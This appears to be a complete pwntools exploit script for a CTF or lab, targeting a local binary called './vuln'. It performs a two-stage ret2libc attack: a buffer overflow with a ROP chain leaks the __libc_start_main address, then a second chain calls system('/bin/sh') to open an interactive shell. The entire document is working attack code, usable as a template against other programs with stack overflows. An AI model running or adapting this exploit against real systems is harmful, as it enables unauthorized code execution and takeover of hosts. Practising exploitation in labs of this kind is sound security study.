#!/usr/bin/python3
from pwn import *


def offset(vaddr_base, elf_base, elf_target):
    return elf_target - elf_base + vaddr_base

def padding(bytes):
    return b'A' * bytes

p = process("./vuln")
elf = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf)

# Extract info from the binary ELF
PUTS = elf.plt['puts']
MAIN = elf.symbols['main']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

log.info("--- BINARY INFO ---")
log.info("puts@plt          " + hex(PUTS))
log.info("main@symbols      " + hex(MAIN))
log.info("__libc_start_main " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget    " + hex(POP_RDI))
log.info("")


# ----- STAGE 1, LEAK -----
log.info("Executing stage one, leak __libc_start_main address")

# Setup ROT chain
#1st: ret to pop rdi, this will pop 2nd into RDI
#2nd: the address where libc_start_main is located
#3rd: ret to puts, this will output the address
#4rd: ret to main, so we get another prompt so we can exec the sploit

rot_chain = p64(POP_RDI) + p64(LIBC_START_MAIN) + p64(PUTS) + p64(MAIN)
payload = padding(40) + rot_chain

# Send payload
p.sendlineafter("ROP.", payload)
p.recvline()
p.recvline()
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, b"\x00"))
log.info("Leaked libc address,  [__libc_start_main %s]" % hex(leak))

# ----- STAGE 2, Gather libc info -----
# 1) Adjust libc starting address
#libc.address = leak - libc.sym['__libc_start_main']

BINSH  = offset(leak, libc.sym['__libc_start_main'], next(libc.search(b"/bin/sh")))
SYSTEM = offset(leak, libc.sym['__libc_start_main'], libc.sym["system"])

log.info("/bin/sh address : %s" % hex(BINSH))
log.info("system address  : %s" % hex(SYSTEM))

# Setup second ROP chain

payload = padding(40) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

log.info("--- Sending exploit, shell should open ---")
p.sendlineafter("ROP.", payload)
p.interactive()


	

